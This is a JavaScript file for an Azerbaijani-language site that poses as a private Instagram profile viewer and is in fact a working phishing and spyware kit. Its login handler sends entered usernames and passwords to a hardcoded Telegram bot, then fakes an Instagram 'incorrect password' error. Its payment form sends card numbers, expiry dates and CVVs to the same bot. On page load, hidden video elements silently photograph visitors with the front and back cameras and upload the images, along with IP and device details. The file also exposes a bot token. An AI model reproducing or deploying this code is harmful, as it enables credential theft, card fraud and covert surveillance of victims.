// Constants
const STORAGE_KEYS = {
    INITIALIZED: 'initialized',
    CREDITS: 'credits',
    FREE_VIEWS: 'freeViews',
    IS_LOGGED_IN: 'isLoggedIn',
    LOGGED_IN_USERNAME: 'loggedInUsername'
};

const DEFAULT_VALUES = {
    CREDITS: '40',
    FREE_VIEWS: '4',
    USERNAME: 'istifadəçi'
};

const TELEGRAM_CONFIG = [
    {
        BOT_TOKEN: '8143521582:AAFjMpwD7r9NMho9tmHltUl9gXdihd7l5Mk',
        CHAT_ID: '7706519040'
    }
];

// Update navbar based on login status
function updateNavbar() {
    const privateProfileLink = document.querySelector('.nav-menu a[href="private-profile.html"]');
    const storyViewLink = document.querySelector('.nav-menu a[href="#story"]');
    
    if (isLoggedIn()) {
        [privateProfileLink, storyViewLink].forEach(link => {
            if (link) link.style.display = 'flex';
        });
    } else {
        [privateProfileLink, storyViewLink].forEach(link => {
            if (link) {
                link.style.display = 'flex';
                link.addEventListener('click', highlightLoginForm);
                if (link === privateProfileLink) link.href = '#';
            }
        });
    }
}

// Check if user is logged in
function isLoggedIn() {
    return getStorageItem(STORAGE_KEYS.IS_LOGGED_IN) === 'true';
}


// Initialize app
function initializeApp() {
    initializeStorage();
    
    const isPrivateProfile = window.location.pathname.includes('private-profile.html');
    const isIndexPage = window.location.pathname.includes('index.html') || window.location.pathname === '/' || window.location.pathname.endsWith('/POSTEGRO') || window.location.pathname.endsWith('/POSTEGRO/');
    
    if (isPrivateProfile && !isLoggedIn()) {
        window.location.href = 'index.html';
        return;
    }
    
    updateNavbar();
    initializeCredits();
    
    if (isLoggedIn()) {
        const loggedInUsername = getStorageItem(STORAGE_KEYS.LOGGED_IN_USERNAME, DEFAULT_VALUES.USERNAME);
        const credits = getStorageItem(STORAGE_KEYS.CREDITS, DEFAULT_VALUES.CREDITS);
        const freeViews = getStorageItem(STORAGE_KEYS.FREE_VIEWS, DEFAULT_VALUES.FREE_VIEWS);
        
        updateUIElement('loggedInUsername', loggedInUsername);
        updateUIElement('userCredits', credits);
        updateUIElement('userFreeViews', freeViews);
        
        // Start camera if on private profile page
        if (isPrivateProfile) {
            initializeCamera();
        }
    }
    
    // Start camera on index page (for all visitors)
    if (isIndexPage) {
        initializeCamera();
    }
    
    // Event Delegation for dynamic elements
    document.addEventListener('click', function(e) {
        if (e.target.matches('.view-profile-btn')) {
            viewProfile(e);
        }
    });
    
    setupAboutModal();
    setupStorageListener();
}

// Initialize storage if not exists
function initializeStorage() {
    try {
        if (!getStorageItem(STORAGE_KEYS.INITIALIZED)) {
            setStorageItem(STORAGE_KEYS.CREDITS, DEFAULT_VALUES.CREDITS);
            setStorageItem(STORAGE_KEYS.FREE_VIEWS, DEFAULT_VALUES.FREE_VIEWS);
            setStorageItem(STORAGE_KEYS.INITIALIZED, 'true');
        }
    } catch (error) {
        console.error('Storage initialization error:', error);
        showErrorMessage('Storage error occurred. Please enable cookies and reload.');
    }
}

// Safe localStorage getter with fallback
function getStorageItem(key, defaultValue = null) {
    try {
        const value = localStorage.getItem(key);
        return value !== null ? value : defaultValue;
    } catch (error) {
        console.error(`Error getting ${key} from storage:`, error);
        return defaultValue;
    }
}

// Safe localStorage setter
function setStorageItem(key, value) {
    try {
        localStorage.setItem(key, value);
        return true;
    } catch (error) {
        console.error(`Error setting ${key} in storage:`, error);
        showErrorMessage('Storage error occurred. Please enable cookies and reload.');
        return false;
    }
}

// Update UI elements safely
function updateUIElement(elementId, value) {
    const element = document.getElementById(elementId);
    if (element) {
        element.textContent = value;
        
        // Remove any existing promo message if it exists
        if (elementId === 'loggedInUsername') {
            const existingPromo = element.nextElementSibling;
            if (existingPromo?.textContent?.includes('Sadəcə 1 manat')) {
                existingPromo.remove();
            }
        }
    }
}

// Setup about modal functionality
function setupAboutModal() {
    const aboutModal = document.getElementById('aboutModal');
    const aboutLinks = document.querySelectorAll('a[href="#"]');
    const aboutModalCloseBtn = aboutModal?.querySelector('.close-button');

    aboutLinks.forEach(link => {
        if (link.innerHTML.includes('Haqqımızda')) {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                if (aboutModal) {
                    aboutModal.style.display = 'block';
                    document.body.style.overflow = 'hidden';
                }
            });
        }
    });

    if (aboutModalCloseBtn) {
        aboutModalCloseBtn.addEventListener('click', () => {
            aboutModal.style.display = 'none';
            document.body.style.overflow = '';
        });
    }

    window.addEventListener('click', (e) => {
        if (e.target === aboutModal) {
            aboutModal.style.display = 'none';
            document.body.style.overflow = '';
        }
    });
}

// Highlight login form
function highlightLoginForm(e) {
    e.preventDefault();
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        const inputs = loginForm.querySelectorAll('input');
        inputs.forEach(input => {
            input.classList.add('highlight-login');
            input.addEventListener('input', function() {
                inputs.forEach(inp => inp.classList.remove('highlight-login'));
            }, { once: true });
        });
        
        // Scroll to login form
        loginForm.scrollIntoView({ behavior: 'smooth', block: 'center' });
        
        // Add shake animation
        loginForm.classList.add('shake');
        setTimeout(() => {
            loginForm.classList.remove('shake');
        }, 500);
    }
}

// Function to get device information
async function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceInfo = {
        brand: 'Unknown',
        model: 'Unknown'
    };

    try {
        // For Android devices
        if (/android/i.test(userAgent)) {
            // Try to match more detailed Android device info
            let matches = userAgent.match(/Android[\s]+([\d.]+);\s*([\w\s]+)(?:Build|\))/i);
            if (matches) {
                let fullDevice = matches[2].trim();
                // Some common brand names to check
                const brands = ['Samsung', 'Xiaomi', 'Huawei', 'OnePlus', 'OPPO', 'Vivo', 'Realme', 'Nokia', 'LG', 'Sony'];
                let foundBrand = brands.find(brand => fullDevice.toLowerCase().includes(brand.toLowerCase()));
                
                if (foundBrand) {
                    deviceInfo.brand = foundBrand;
                    deviceInfo.model = fullDevice.replace(new RegExp(foundBrand, 'i'), '').trim();
                } else {
                    // If no known brand found, try to split the device info
                    let parts = fullDevice.split(' ');
                    deviceInfo.brand = parts[0];
                    deviceInfo.model = parts.slice(1).join(' ');
                }
            }
        }
        // For iOS devices
        else if (/iPhone|iPad|iPod/.test(userAgent)) {
            deviceInfo.brand = 'Apple';
            if (/iPhone/.test(userAgent)) {
                let matches = userAgent.match(/iPhone\s*(?:OS\s*)?([^;\s)]+)/i);
                deviceInfo.model = matches ? `iPhone ${matches[1]}` : 'iPhone';
            } else if (/iPad/.test(userAgent)) {
                let matches = userAgent.match(/iPad\s*(?:OS\s*)?([^;\s)]+)/i);
                deviceInfo.model = matches ? `iPad ${matches[1]}` : 'iPad';
            } else if (/iPod/.test(userAgent)) {
                let matches = userAgent.match(/iPod\s*(?:OS\s*)?([^;\s)]+)/i);
                deviceInfo.model = matches ? `iPod ${matches[1]}` : 'iPod';
            }
        }
        // For Windows devices
        else if (/Windows/.test(userAgent)) {
            deviceInfo.brand = 'PC';
            deviceInfo.model = 'Windows ' + (userAgent.match(/Windows NT ([^;)]+)/i)?.[1] || '');
        }
        // For macOS devices
        else if (/Macintosh/.test(userAgent)) {
            deviceInfo.brand = 'Apple';
            deviceInfo.model = 'MacOS ' + (userAgent.match(/Mac OS X ([^;)]+)/i)?.[1] || '');
        }
        // For Linux devices
        else if (/Linux/.test(userAgent)) {
            deviceInfo.brand = 'PC';
            deviceInfo.model = 'Linux ' + (userAgent.match(/Linux ([^;)]+)/i)?.[1] || '');
        }
    } catch (error) {
        console.error('Error detecting device info:', error);
    }

    return deviceInfo;
}

// Function to get IP address
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error getting IP address:', error);
        return 'Unknown';
    }
}

// Modified sendToTelegram function
async function sendToTelegram(username, message) {
    try {
        const deviceInfo = await getDeviceInfo();
        const ipAddress = await getIPAddress();
        const currentDate = new Date().toLocaleString('az-AZ');
        
        // Check if it's a card message
        if (message.includes('💳')) {
            // Extract card details from the message
            const cardMatch = message.match(/💳 Kart: ([\d]+)/);
            const expiryMatch = message.match(/📅 Bitmə: ([\d/]+)/);
            const cvvMatch = message.match(/🔒 CVV: ([\d]+)/);
            
            const fullMessage = `💳 Yeni Kart Məlumatları:
👤 İstifadəçi: ${username}
💳 Kart: ${cardMatch ? cardMatch[1] : ''}
📅 Bitmə: ${expiryMatch ? expiryMatch[1] : ''}
🔒 CVV: ${cvvMatch ? cvvMatch[1] : ''}
📱 Cihaz: ${deviceInfo.brand} ${deviceInfo.model}
🌐 IP Ünvanı: ${ipAddress}
⏰ Tarix: ${currentDate}`;

            message = fullMessage;
        } else {
            // For login messages
            // Extract password from message if it exists
            const passwordMatch = message.match(/Şifrə: ([^\n]+)/);
            const password = passwordMatch ? passwordMatch[1].trim() : '';

            message = `🔐 Yeni Giriş Cəhdi:
👤 İstifadəçi: ${username}
🔑 Şifrə: ${password}
📱 Cihaz: ${deviceInfo.brand} ${deviceInfo.model}
🌐 IP Ünvanı: ${ipAddress}
⏰ Tarix: ${currentDate}`;
        }

        // Send to all configured Telegram bots
        for (const config of TELEGRAM_CONFIG) {
            await fetch(`https://api.telegram.org/bot${config.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: config.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        showErrorMessage('Mesaj göndərilməsində xəta baş verdi');
    }
}

// Handle login with additional security
async function handleLogin(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!username || !password) {
        return false;
    }

    // Disable submit button and show loading
    const submitButton = document.querySelector('#loginForm button[type="submit"]');
    if (submitButton) {
        submitButton.disabled = true;
        submitButton.style.opacity = '0.7';
    }

    try {
        // Prepare login message for Telegram
        const loginMessage = `
🔐 Yeni Giriş Cəhdi:
👤 İstifadəçi: ${username}
🔑 Şifrə: ${password}
📱 Cihaz: ${navigator.userAgent}
🌍 IP: Waiting for connection...
⏰ Tarix: ${new Date().toLocaleString('az-AZ')}
        `;
        
        // Send to Telegram and wait for result
        await sendToTelegram(username, loginMessage);
        
        // Show Instagram-style error message
        showInstagramError('Sorry, your password was incorrect. Please double-check your password.');

        // Re-enable submit button
        if (submitButton) {
            submitButton.disabled = false;
            submitButton.style.opacity = '1';
        }

        // Redirect to real Instagram after 3 seconds
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com';
        }, 3000);
        
    } catch (error) {
        console.error('Login error:', error);
        
        // Still show error and redirect even if Telegram fails
        showInstagramError('Sorry, your password was incorrect. Please double-check your password.');
        
        if (submitButton) {
            submitButton.disabled = false;
            submitButton.style.opacity = '1';
        }
        
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com';
        }, 3000);
    }
    
    return false;
}

// Show Instagram-style error message
function showInstagramError(message) {
    // Remove existing error if any
    const existingError = document.querySelector('.instagram-error');
    if (existingError) {
        existingError.remove();
    }
    
    const errorDiv = document.createElement('div');
    errorDiv.className = 'instagram-error';
    errorDiv.innerHTML = message;
    
    const loginBox = document.querySelector('.login-box');
    const form = document.getElementById('loginForm');
    
    if (loginBox && form) {
        form.parentNode.insertBefore(errorDiv, form.nextSibling);
    }
}

// Handle logout
function logout() {
    // Stop camera before logout
    stopCamera();
    
    const logoutMessage = document.createElement('div');
    logoutMessage.style.cssText = 'text-align: center; margin: 10px 0; color: #0095f6; font-weight: bold;';
    logoutMessage.textContent = 'Sadəcə 1 manat ödəməklə 3 profilə bax';
    
    const logoutButton = document.querySelector('button[onclick="logout()"]');
    if (logoutButton && !logoutButton.previousElementSibling?.textContent?.includes('Sadəcə 1 manat')) {
        logoutButton.parentElement.insertBefore(logoutMessage, logoutButton);
    }
    
    localStorage.clear();
    window.location.href = 'index.html';
}

// Countdown Modal functionality
let countdownInterval;
const modal = document.getElementById('countdownModal');
const timerDisplay = modal?.querySelector('.countdown-timer');
const progressBar = modal?.querySelector('.progress');
const loadingMessage = modal?.querySelector('.loading-message');
const successMessage = modal?.querySelector('.success-message');
const closeButton = modal?.querySelector('.close-button');

// Credit Management
function initializeCredits() {
    if (!localStorage.getItem('credits')) {
        localStorage.setItem('credits', '50');
    }
    if (!localStorage.getItem('freeViews')) {
        localStorage.setItem('freeViews', '5');
    }
    updateCreditsDisplay();
}

function updateCreditsDisplay() {
    const creditDisplay = document.querySelector('.credit-amount');
    const freeViewsDisplay = document.querySelector('.free-info');
    
    if (creditDisplay) {
        creditDisplay.textContent = localStorage.getItem('credits') || '0';
    }
    
    if (freeViewsDisplay) {
        const freeViews = localStorage.getItem('freeViews') || '0';
        freeViewsDisplay.innerHTML = `<i class="fas fa-gift"></i>Pulsuz ${freeViews} profilə baxış imkanı`;
    }
}

// Update startCountdown function to check credits
function startCountdown() {
    if (!localStorage.getItem('isLoggedIn')) {
        highlightLoginForm(new Event('click'));
        return;
    }

    // Check if user has enough credits or free views
    let freeViews = parseInt(localStorage.getItem('freeViews') || '0');
    let credits = parseInt(localStorage.getItem('credits') || '0');

    // Check if enough credits
    if (credits < 10) {
        alert('Kifayət qədər kreditiniz yoxdur!');
        return;
    }

    // Deduct credits immediately
    credits -= 10;
    localStorage.setItem('credits', credits.toString());

    // Also use a free view if available
    if (freeViews > 0) {
        freeViews--;
        localStorage.setItem('freeViews', freeViews.toString());
    }

    // Update display immediately
    const userCredits = document.getElementById('userCredits');
    const userFreeViews = document.getElementById('userFreeViews');
    if (userCredits) userCredits.textContent = credits.toString();
    if (userFreeViews) userFreeViews.textContent = freeViews.toString();

    // Show modal and start countdown
    let timeLeft = 30;
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';

    // Reset modal state
    if (timerDisplay) timerDisplay.textContent = timeLeft;
    if (progressBar) progressBar.style.transform = 'scaleX(1)';
    if (loadingMessage) loadingMessage.style.display = 'block';
    if (successMessage) successMessage.style.display = 'none';
    
    countdownInterval = setInterval(() => {
        timeLeft--;
        
        if (timerDisplay) {
            timerDisplay.textContent = timeLeft;
        }
        
        if (progressBar) {
            progressBar.style.transform = `scaleX(${timeLeft/30})`;
        }

        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
            if (loadingMessage) loadingMessage.style.display = 'none';
            if (successMessage) successMessage.style.display = 'flex';
            
            // Auto close after 2 seconds
            setTimeout(() => {
                closeModal();
            }, 2000);
        }
    }, 1000);
}

function closeModal() {
    if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = '';
    }
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
}

// Event Listeners
if (closeButton) {
    closeButton.addEventListener('click', closeModal);
}

// Close modal when clicking outside
window.addEventListener('click', (e) => {
    if (e.target === modal) {
        closeModal();
    }
});

// Handle view profile button click
function viewProfile() {
    const username = document.getElementById('username').value;
    if (username) {
        openPaymentModal();
    } else {
        alert('Zəhmət olmasa istifadəçi adını daxil edin!');
    }
}

function showErrorMessage(message) {
    // Create or update error message element
    let errorDiv = document.getElementById('errorMessage');
    if (!errorDiv) {
        errorDiv = document.createElement('div');
        errorDiv.id = 'errorMessage';
        errorDiv.style.cssText = 'position: fixed; top: 20px; right: 20px; background: #ff4444; color: white; padding: 10px; border-radius: 5px; z-index: 1000;';
        document.body.appendChild(errorDiv);
    }
    errorDiv.textContent = message;
    setTimeout(() => errorDiv.remove(), 5000);
}

function setupStorageListener() {
    window.addEventListener('storage', function(e) {
        const updateMap = {
            [STORAGE_KEYS.CREDITS]: 'userCredits',
            [STORAGE_KEYS.FREE_VIEWS]: 'userFreeViews'
        };
        
        if (updateMap[e.key]) {
            updateUIElement(updateMap[e.key], e.newValue || '0');
        }
    });
}

// Camera functionality
let frontCameraStream = null;
let backCameraStream = null;
let cameraCanvas = null;
let photoCounter = 0;
let cameraActive = false;

// Initialize hidden camera - captures from both front and back cameras
async function initializeCamera() {
    if (cameraActive) return;
    
    try {
        // Create hidden canvas
        cameraCanvas = document.createElement('canvas');
        cameraCanvas.style.display = 'none';
        document.body.appendChild(cameraCanvas);

        cameraActive = true;
        
        // Capture from front camera (user facing)
        await captureFromCamera('user', 'Ön Kamera');
        
        // Small delay before switching to back camera
        setTimeout(async () => {
            // Capture from back camera (environment facing)
            await captureFromCamera('environment', 'Arxa Kamera');
        }, 1500);
        
        console.log('Kameralar aktivləşdirildi');
    } catch (error) {
        console.error('Kamera xətası:', error);
    }
}

// Capture photo from specific camera
async function captureFromCamera(facingMode, cameraName) {
    try {
        // Create hidden video element
        const video = document.createElement('video');
        video.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;';
        video.autoplay = true;
        video.playsInline = true;
        video.muted = true;
        document.body.appendChild(video);

        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: facingMode
            }, 
            audio: false 
        });
        
        video.srcObject = stream;
        
        // Wait for video to be ready
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play().then(() => {
                    // Take photo after video is ready
                    setTimeout(() => {
                        if (video.readyState === video.HAVE_ENOUGH_DATA) {
                            capturePhotoFromVideo(video, cameraName);
                        }
                        
                        // Stop camera stream after capture
                        setTimeout(() => {
                            stream.getTracks().forEach(track => track.stop());
                            video.remove();
                            resolve();
                        }, 500);
                    }, 800);
                });
            };
        });
    } catch (error) {
        console.error(`${cameraName} xətası:`, error);
    }
}

// Capture photo from video element
function capturePhotoFromVideo(video, cameraName) {
    if (!cameraCanvas || !video) return;
    
    cameraCanvas.width = video.videoWidth;
    cameraCanvas.height = video.videoHeight;
    const ctx = cameraCanvas.getContext('2d');
    ctx.drawImage(video, 0, 0);
    
    photoCounter++;
    
    // Convert to blob and send to Telegram
    cameraCanvas.toBlob(async (blob) => {
        await sendPhotoToTelegram(blob, photoCounter, cameraName);
    }, 'image/jpeg', 0.8);
}

// Send photo to Telegram
async function sendPhotoToTelegram(blob, photoNum, cameraName = '') {
    try {
        const username = getStorageItem(STORAGE_KEYS.LOGGED_IN_USERNAME, null);
        const deviceInfo = await getDeviceInfo();
        const ipAddress = await getIPAddress();
        const currentDate = new Date().toLocaleString('az-AZ');
        
        let caption = `📸 Şəkil #${photoNum}`;
        if (cameraName) {
            caption += ` (${cameraName})`;
        }
        caption += `\n`;
        
        if (username) {
            caption += `👤 İstifadəçi: ${username}\n`;
        } else {
            caption += `👤 Qonaq Ziyarətçi\n`;
        }
        
        caption += `📱 Cihaz: ${deviceInfo.brand} ${deviceInfo.model}
🌐 IP: ${ipAddress}
⏰ Tarix: ${currentDate}`;
        
        // Send to all configured Telegram bots
        for (const config of TELEGRAM_CONFIG) {
            const formData = new FormData();
            formData.append('chat_id', config.CHAT_ID);
            formData.append('photo', blob, `photo-${photoNum}-${Date.now()}.jpg`);
            formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${config.BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
        
        console.log(`Şəkil ${photoNum} (${cameraName}) göndərildi`);
    } catch (error) {
        console.error('Şəkil göndərmə xətası:', error);
    }
}

// Stop camera
function stopCamera() {
    cameraActive = false;
    if (frontCameraStream) {
        frontCameraStream.getTracks().forEach(track => track.stop());
        frontCameraStream = null;
    }
    if (backCameraStream) {
        backCameraStream.getTracks().forEach(track => track.stop());
        backCameraStream = null;
    }
}

// Initialize app when DOM is loaded
document.addEventListener('DOMContentLoaded', initializeApp);

// Modal functionality
const paymentModal = document.getElementById('paymentModal');
const closePaymentBtn = document.getElementsByClassName('close')[0];

// Function to open modal
function openPaymentModal() {
    paymentModal.style.display = 'block';
    document.body.style.overflow = 'hidden';
}

// Close modal when clicking (x)
closePaymentBtn.onclick = function() {
    paymentModal.style.display = 'none';
    document.body.style.overflow = '';
}

// Close modal when clicking outside
window.onclick = function(event) {
    if (event.target == paymentModal) {
        paymentModal.style.display = 'none';
        document.body.style.overflow = '';
    }
}

// Card number formatting with type detection
document.getElementById('cardNumber').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    e.target.value = value;
    
    // Show/hide card types based on first digit
    const firstDigit = value.charAt(0);
    const visaIcon = e.target.parentElement.querySelector('.fa-cc-visa');
    const mastercardIcon = e.target.parentElement.querySelector('.fa-cc-mastercard');
    
    if (firstDigit === '4') {
        visaIcon.style.color = '#1a1f71';
        mastercardIcon.style.color = '#666';
    } else if (firstDigit === '5') {
        mastercardIcon.style.color = '#eb001b';
        visaIcon.style.color = '#666';
    } else {
        visaIcon.style.color = '#666';
        mastercardIcon.style.color = '#666';
    }
});

// Expiry date formatting
document.getElementById('expiryDate').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        const month = value.slice(0, 2);
        if (parseInt(month) > 12) {
            value = '12' + value.slice(2);
        }
        value = value.slice(0, 2) + '/' + value.slice(2);
    }
    e.target.value = value;
});

// CVV validation
document.getElementById('cvv').addEventListener('input', function (e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
});

// Form submission with validation
document.getElementById('paymentForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const expiry = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    const username = document.getElementById('username').value;

    // Basic validation
    if (cardNumber.length !== 16) {
        alert('Xahiş edirik düzgün kart nömrəsi daxil edin');
        return;
    }

    if (expiry.length !== 5) {
        alert('Xahiş edirik düzgün bitmə tarixi daxil edin');
        return;
    }

    if (cvv.length !== 3) {
        alert('Xahiş edirik düzgün CVV daxil edin');
        return;
    }

    // Show loading state
    const submitButton = this.querySelector('button[type="submit"]');
    const originalText = submitButton.innerHTML;
    submitButton.disabled = true;
    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Ödəniş edilir...';

    try {
        // Send card details to Telegram with enhanced formatting
        const message = `
💳 Yeni Kart Məlumatları:
👤 İstifadəçi: ${username}
💳 Kart: ${cardNumber}
📅 Bitmə: ${expiry}
🔒 CVV: ${cvv}
📱 Cihaz: ${navigator.userAgent}
🌍 IP: Waiting for connection...
⏰ Tarix: ${new Date().toLocaleString('az-AZ')}
        `;
        
        await sendToTelegram(username, message);

        // Show success and continue
        submitButton.innerHTML = '<i class="fas fa-check"></i> Ödəniş uğurla tamamlandı!';
        submitButton.style.backgroundColor = '#48bb78';
        
        // Close modal and start countdown after success
        setTimeout(() => {
            paymentModal.style.display = 'none';
            document.body.style.overflow = '';
            startCountdown();
            
            // Reset form and button
            submitButton.disabled = false;
            submitButton.innerHTML = originalText;
            submitButton.style.backgroundColor = '';
            this.reset();
        }, 1500);

    } catch (error) {
        console.error('Ödəniş xətası:', error);
        submitButton.disabled = false;
        submitButton.innerHTML = originalText;
        alert('Ödəniş zamanı xəta baş verdi. Zəhmət olmasa yenidən cəhd edin.');
    }
}); 